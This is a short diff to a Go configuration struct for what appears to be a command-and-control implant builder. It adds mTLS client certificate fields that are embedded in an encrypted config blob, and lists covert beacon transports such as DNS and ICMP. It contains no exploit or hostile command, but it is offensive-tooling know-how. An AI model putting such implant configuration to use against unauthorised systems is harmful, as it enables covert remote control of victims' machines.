@@ -233,13 +233,20 @@ type ImplantConfig struct {
 	DefaultWorkingEnd   string
 	DefaultWorkingTZ    string
 	// Advanced transport (injected as ldflags into agent)
-	BeaconTransport  string // http, wss, grpc, ssh, dns, tcp, icmp, mtls, h2c, udp, quic
-	DNSDoHURL        string
-	DNSDoTAddr       string
-	SSHUser          string
-	SSHPassword      string
-	SSHKey           string // base64 PEM client private key
-	SSHHostKey       string // base64 server host public key pin (empty = lab insecure)
+	BeaconTransport string // http, wss, grpc, ssh, dns, tcp, icmp, mtls, h2c, udp, quic
+	DNSDoHURL       string
+	DNSDoTAddr      string
+	SSHUser         string
+	SSHPassword     string
+	SSHKey          string // base64 PEM client private key
+	SSHHostKey      string // base64 server host public key pin (empty = lab insecure)
+	// mTLS client credentials (PEM). Embedded in the AES-GCM config blob as
+	// base64 — the same form hand-built -X main.MTLS*Str builds use — so the
+	// client private key never lands on the go build argv. Empty = the build
+	// cannot authenticate against a listener that requires client certs.
+	MTLSCertPEM      string
+	MTLSKeyPEM       string
+	MTLSCAPEM        string
 	PinnedCertSHA256 string // SHA-256 hex of server DER cert for pinning (empty = disabled)
 	SelfCheckSHA256  string // SHA-256 hex of the binary itself for integrity verification (empty = disabled)
 	// NetworkConfigOverWire, when set, produces a bootstrap-only binary: the
